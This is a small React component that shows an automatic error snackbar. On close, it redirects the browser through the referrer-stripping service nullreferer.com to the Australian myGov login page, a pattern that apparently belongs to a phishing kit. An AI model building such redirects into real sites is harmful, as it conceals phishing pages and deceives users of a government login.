import React from 'react'
import Stack from '@mui/material/Stack';
import Button from '@mui/material/Button';
import Snackbar from '@mui/material/Snackbar';
import MuiAlert from '@mui/material/Alert';

const Alert = React.forwardRef(function Alert(props, ref) {
    return <MuiAlert elevation={6} ref={ref} variant="filled" {...props} />;
  });
  


const Snackback = () => {
    const [open, setOpen] = React.useState(true);

    const handleClick = () => {
      setOpen(true);
    };
  
    const handleClose = (event, reason) => {
      if (reason === 'clickaway') {
        return;
      }
      setOpen(false);
      window.location.href = 'https://nullreferer.com/?https://login.my.gov.au/las/mygov-login?execution=e1s1';
    };
  
    return (
      <Stack spacing={2} sx={{ width: '100%' }}>
        <Snackbar open={open}  onClose={handleClose}>
          <Alert onClose={handleClose} severity="error" sx={{ width: '100%' }}>
            This is an error message!
          </Alert>
        </Snackbar>
        
      </Stack>
    );
}

export default Snackback